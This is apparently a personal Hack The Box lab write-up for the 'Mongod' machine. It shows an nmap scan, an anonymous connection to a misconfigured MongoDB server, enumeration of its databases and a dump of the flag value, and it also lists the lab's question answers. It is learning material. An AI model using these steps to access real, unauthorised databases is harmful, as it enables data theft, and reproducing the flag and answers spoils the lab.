#mongodb #databases #reconnaissance #misconfiguration #anonymous-access 

# 0. Theory

MongoDB is a document-oriented NoSQL database.
In a document-oriented NoSQL database, the data is organized into a hierarchy of the following levels:
- databases
- collections
- documents

Databases make up the top level of data organization in a MongoDB instance. Databases are organized into collections which contain documents. Documents contain literal data such as strings, numbers, dates, etc. in a JSON-like format.

It often happens that the database server is misconfigured to permit anonymous login which can be exploited by an attacker to get access to sensitive information stored on the database. Mongod is a Linux box that features a MongoDB server running on it which allows anonymous login without a username or password. We can remotely connect to this MongoDB server using the mongo command line utility and enumerate the database.

Instead of using tables and rows like in traditional relational databases, MongoDB makes use of collections and documents. Each database contains collections which in turn further contain documents. Each document consists of key-value pairs which are the basic unit of data in a MongoDB database. A single collection can contain multiple documents and they are schema-less meaning that the size and content of each document can be different from each another.
![[Pasted image 20240828112815.png]]


**What type of database is MongoDB?**
*NoSQL*

**What is the command name for the Mongo shell that is installed with the mongodb-clients package?**
*mongo*

**What is the command used for listing all the databases present on the MongoDB server?**
*show dbs*

**What is the command used for listing out the collections in a database?**
*show collections*

**What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?**
`db.flag.find().pretty()`


# 1. Recon

Verify target and its availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-fwwncs60gy]─[~]
	└──╼ [★]$ ping 10.129.68.95
	PING 10.129.68.95 (10.129.68.95) 56(84) bytes of data.
	64 bytes from 10.129.68.95: icmp_seq=1 ttl=63 time=8.09 ms
	64 bytes from 10.129.68.95: icmp_seq=2 ttl=63 time=8.48 ms
	64 bytes from 10.129.68.95: icmp_seq=3 ttl=63 time=8.36 ms
	64 bytes from 10.129.68.95: icmp_seq=4 ttl=63 time=7.93 ms
	^C
	--- 10.129.68.95 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 7.929/8.216/8.483/0.218 ms

# 2. Enumeration

For port scanning, we will be using the following flags for nmap:
	-p- : This flag scans for all TCP ports ranging from 0-65535
	-sV : Attempts to determine the version of the service running on a port
	--min-rate : This is used to specify the minimum number of packets that Nmap should send per second; it speeds up the scan as the number goes higher

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-fwwncs60gy]─[~]
	└──╼ [★]$ nmap --min-rate=1000 -p- -sV 10.129.68.95
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 04:34 CDT
	Nmap scan report for 10.129.68.95
	Host is up (0.0088s latency).
	Not shown: 65533 closed tcp ports (reset)
	PORT      STATE SERVICE VERSION
	22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	27017/tcp open  mongodb MongoDB 3.6.8
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds

The scan reveals that the server is running SSH on port 22, and mongodb on port **27017**.

## Connecting to MongoDB
In order to connect to the remote MongoDB server running on the target box, we will need to install the mongodb utility.
On Debian-based linux distributions (like Kali, Ubuntu, Parrot):

	curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz

Then extract the contents of the tar archive file using the `tar` utility.

	tar xvf mongodb-linux-x86_64-3.4.7.tgz

Navigate to the location where the `mongo` binary is present.

	cd mongodb-linux-x86_64-3.4.7/bin

Let's try to connect to the MongoDB server running on the remote host as an anonymous user.

	./mongo mongodb://{target_IP}:27017

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-fwwncs60gy]─[~/mongodb-linux-x86_64-3.4.7/bin]
	└──╼ [★]$ ./mongo mongodb://10.129.68.95:27017
	MongoDB shell version v3.4.7
	connecting to: mongodb://10.129.68.95:27017
	MongoDB server version: 3.6.8
	WARNING: shell and server versions do not match
	Welcome to the MongoDB shell.
	For interactive help, type "help".
	For more comprehensive documentation, see
		http://docs.mongodb.org/
	Questions? Try the support group
		http://groups.google.com/group/mongodb-user
	Server has startup warnings: 
	2024-08-28T09:27:39.967+0000 I STORAGE  [initandlisten] 
	2024-08-28T09:27:39.967+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
	2024-08-28T09:27:39.967+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
	2024-08-28T09:27:41.360+0000 I CONTROL  [initandlisten] 
	2024-08-28T09:27:41.361+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
	2024-08-28T09:27:41.361+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
	2024-08-28T09:27:41.361+0000 I CONTROL  [initandlisten] 

We see that we have successfully connected to the remote MongoDB instance as an anonymous user.
We can list the databases present on the MongoDB server using the `show dbs;` command.

	~> show dbs;
	admin                  0.000GB
	config                 0.000GB
	local                  0.000GB
	sensitive_information  0.000GB
	users                  0.000GB

We can select a db with the `use` command to enumerate further.

	~> use sensitive_information;
	switched to db sensitive_information

We can list down the collections stored in the `sensitive_information` database using the `show collections` command.

	~> show collections
	flag

There is a single collection named `flag` . We can dump the contents of the documents present in the `flag` collection by using the `db.collection.find()` command. Let's replace the collection name `flag` in the command and also use `pretty()` in order to receive the output in a beautified format.

	~> db.flag.find()
	{ "_id" : ObjectId("630e3dbcb82540ebbd1748c5"), "flag" : "1b6e6fb359e7c40241b6d431427ba6ea" }
	~> db.flag.find().pretty()
	{
		"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
		"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
	}


https://www.hackthebox.com/achievement/machine/2057492/501
![[Pasted image 20240828115426.png]]